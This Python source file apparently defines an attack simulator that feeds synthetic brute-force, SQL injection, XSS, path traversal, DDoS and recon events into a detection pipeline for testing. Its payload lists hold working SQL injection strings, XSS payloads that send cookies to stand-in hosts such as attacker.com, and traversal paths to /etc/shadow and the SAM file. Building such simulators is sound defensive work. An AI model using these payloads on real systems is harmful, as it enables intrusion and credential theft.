"""
Virtual Cyberattack Scenario Engine
Generates realistic, safe attack simulations and benign traffic:
- Brute Force / Credential Stuffing
- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Directory / Path Traversal
- Volumetric Network DDoS Flood
- Reconnaissance / Port Probing
- Benign Real-World User Traffic
- Custom Vector Injection
- Background Traffic Generator Thread
"""

import time
import random
import threading
from typing import Callable, Optional

class AttackSimulator:
    def __init__(self, ingestion_pipeline: Callable):
        self.ingestion_pipeline = ingestion_pipeline
        self.continuous_running = False
        self.continuous_thread: Optional[threading.Thread] = None

        # Sample attacker IPs
        self.attacker_ips = [
            "185.220.101.5",
            "194.26.29.112",
            "45.154.255.88",
            "103.251.167.20",
            "198.51.100.42",
            "203.0.113.88",
            "91.240.118.172"
        ]

        # Sample benign IPs
        self.benign_ips = [
            "192.168.1.15",
            "192.168.1.20",
            "10.0.4.52",
            "172.16.2.14",
            "192.168.1.105"
        ]

        # SQL Injection attack library
        self.sqli_payloads = [
            "' OR '1'='1' --",
            "admin' UNION SELECT id, username, password_hash FROM users--",
            "1; DROP TABLE audit_logs;--",
            "' OR 1=1; EXEC xp_cmdshell('whoami');--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND '1'='1",
            "test' UNION ALL SELECT NULL, NULL, version()--"
        ]

        # XSS attack library
        self.xss_payloads = [
            "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
            "<img src=x onerror=\"fetch('https://c2.darknet.org/keys?c='+document.cookie)\">",
            "<svg/onload=alert('XSS_BREACH')>",
            "<iframe src=\"javascript:alert('Injected_Payload')\"></iframe>",
            "<script>eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbS9zdGVhbCI='))</script>"
        ]

        # Path Traversal attack library
        self.traversal_payloads = [
            "../../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2fwindows%2fsystem32%2fconfig%2fsam",
            "../../../../var/log/auth.log",
            "../../../../boot.ini",
            "....//....//....//etc/shadow"
        ]

        # Recon probe endpoints
        self.recon_endpoints = [
            "/.env",
            "/wp-login.php",
            "/actuator/health",
            "/admin/config.json",
            "/api/v1/internal/debug",
            "/phpmyadmin/index.php",
            "/backup.sql",
            "/.git/HEAD"
        ]

        # Benign payloads & actions
        self.benign_templates = [
            {"endpoint": "/api/v1/products", "method": "GET", "payload": "category=laptops&sort=price_asc", "user": "alice_smith"},
            {"endpoint": "/api/v1/dashboard/summary", "method": "GET", "payload": "", "user": "sec_analyst_01"},
            {"endpoint": "/api/v1/user/settings", "method": "POST", "payload": '{"theme": "dark", "notifications": true}', "user": "sys_admin"},
            {"endpoint": "/api/v1/documents/view", "method": "GET", "payload": "doc_id=quarterly_security_report_2026.pdf", "user": "alice_smith"},
            {"endpoint": "/api/v1/contact", "method": "POST", "payload": "name=John+Doe&message=Inquiry+regarding+service+status", "user": "guest_394"}
        ]

    def run_scenario(self, scenario_name: str, count: int = 1, custom_ip: str = None) -> list:
        """Executes a predefined or tailored cyberattack scenario."""
        results = []

        if scenario_name == "brute_force":
            ip = custom_ip or "185.220.101.5"
            passwords = ["admin", "123456", "password123", "root", "toor", "P@ssw0rd2024", "letmein", "admin123"]
            user_target = "sys_admin"
            num_attempts = max(5, count if count > 1 else 6)
            for i in range(num_attempts):
                pwd = passwords[i % len(passwords)]
                event = {
                    "ip": ip,
                    "endpoint": "/api/v1/auth/login",
                    "method": "POST",
                    "payload": f"username={user_target}&password={pwd}",
                    "user": user_target,
                    "is_failed_login": True,
                    "user_agent": "Mozilla/5.0 (Hydra/v9.5; Linux x86_64)",
                    "session_id": None
                }
                res = self.ingestion_pipeline(event)
                results.append(res)
                time.sleep(0.04)

        elif scenario_name == "sql_injection":
            ip = custom_ip or "194.26.29.112"
            num_attempts = max(1, count)
            for i in range(num_attempts):
                payload = self.sqli_payloads[i % len(self.sqli_payloads)]
                event = {
                    "ip": ip,
                    "endpoint": "/api/v1/user/search",
                    "method": "POST",
                    "payload": f"query={payload}&filter=active",
                    "user": "anonymous",
                    "is_failed_login": False,
                    "user_agent": "sqlmap/1.7#stable (http://sqlmap.org)",
                    "session_id": "sess_demo_analyst" if i == 0 else None
                }
                res = self.ingestion_pipeline(event)
                results.append(res)
                time.sleep(0.05)

        elif scenario_name == "xss_attack":
            ip = custom_ip or "45.154.255.88"
            num_attempts = max(1, count)
            for i in range(num_attempts):
                payload = self.xss_payloads[i % len(self.xss_payloads)]
                event = {
                    "ip": ip,
                    "endpoint": "/api/v1/comments/submit",
                    "method": "POST",
                    "payload": f"author=attacker&comment={payload}",
                    "user": "guest_attacker",
                    "is_failed_login": False,
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "session_id": "sess_demo_admin" if i == 0 else None
                }
                res = self.ingestion_pipeline(event)
                results.append(res)
                time.sleep(0.05)

        elif scenario_name == "path_traversal":
            ip = custom_ip or "103.251.167.20"
            num_attempts = max(1, count)
            for i in range(num_attempts):
                payload = self.traversal_payloads[i % len(self.traversal_payloads)]
                event = {
                    "ip": ip,
                    "endpoint": "/api/v1/documents/download",
                    "method": "GET",
                    "payload": f"filename={payload}",
                    "user": "anonymous",
                    "is_failed_login": False,
                    "user_agent": "Mozilla/5.0 (DotDotPwn/v3.0)",
                    "session_id": None
                }
                res = self.ingestion_pipeline(event)
                results.append(res)
                time.sleep(0.05)

        elif scenario_name == "ddos_flood":
            ip = custom_ip or "203.0.113.88"
            # High-velocity flood burst
            burst_size = max(15, count if count > 1 else 25)
            for i in range(burst_size):
                event = {
                    "ip": ip,
                    "endpoint": "/api/v1/gateway",
                    "method": "GET",
                    "payload": f"sync_id={random.randint(1000, 9999)}&token=flood_{i}",
                    "user": "anonymous",
                    "is_failed_login": False,
                    "user_agent": "LOIC/2.1 (Denial of Service Packet Generator)",
                    "session_id": None
                }
                res = self.ingestion_pipeline(event)
                results.append(res)
                time.sleep(0.01)

        elif scenario_name == "recon_scan":
            ip = custom_ip or "91.240.118.172"
            endpoints_to_scan = self.recon_endpoints[:max(4, count)]
            for ep in endpoints_to_scan:
                event = {
                    "ip": ip,
                    "endpoint": ep,
                    "method": "GET",
                    "payload": "",
                    "user": "anonymous",
                    "is_failed_login": False,
                    "user_agent": "Nikto/2.1.6 (OSVDB-0)",
                    "session_id": None
                }
                res = self.ingestion_pipeline(event)
                results.append(res)
                time.sleep(0.04)

        elif scenario_name == "benign":
            ip = custom_ip or random.choice(self.benign_ips)
            num_attempts = max(1, count)
            for _ in range(num_attempts):
                tpl = random.choice(self.benign_templates)
                event = {
                    "ip": ip,
                    "endpoint": tpl["endpoint"],
                    "method": tpl["method"],
                    "payload": tpl["payload"],
                    "user": tpl["user"],
                    "is_failed_login": False,
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "session_id": "sess_demo_analyst" if tpl["user"] == "sec_analyst_01" else None
                }
                res = self.ingestion_pipeline(event)
                results.append(res)
                time.sleep(0.04)

        return results

    def inject_custom(self, ip: str, endpoint: str, method: str, payload: str, user: str = "custom_actor", session_id: str = None) -> dict:
        """Injects a user-crafted custom event into the pipeline."""
        event = {
            "ip": ip or "192.0.2.1",
            "endpoint": endpoint or "/api/v1/test",
            "method": method.upper() if method else "GET",
            "payload": payload or "",
            "user": user or "anonymous",
            "is_failed_login": False,
            "user_agent": "Custom-Payload-Tester/1.0",
            "session_id": session_id or None
        }
        return self.ingestion_pipeline(event)

    def start_continuous(self, interval_seconds: float = 1.5):
        """Starts background traffic generator thread."""
        if self.continuous_running:
            return
        self.continuous_running = True

        def loop():
            scenarios = ["benign", "benign", "benign", "sql_injection", "brute_force", "benign", "xss_attack", "recon_scan", "benign", "path_traversal", "ddos_flood"]
            while self.continuous_running:
                scen = random.choice(scenarios)
                try:
                    self.run_scenario(scen, count=1)
                except Exception as e:
                    print(f"Simulator continuous error: {e}")
                time.sleep(interval_seconds)

        self.continuous_thread = threading.Thread(target=loop, daemon=True)
        self.continuous_thread.start()

    def stop_continuous(self):
        """Stops background traffic generator thread."""
        self.continuous_running = False
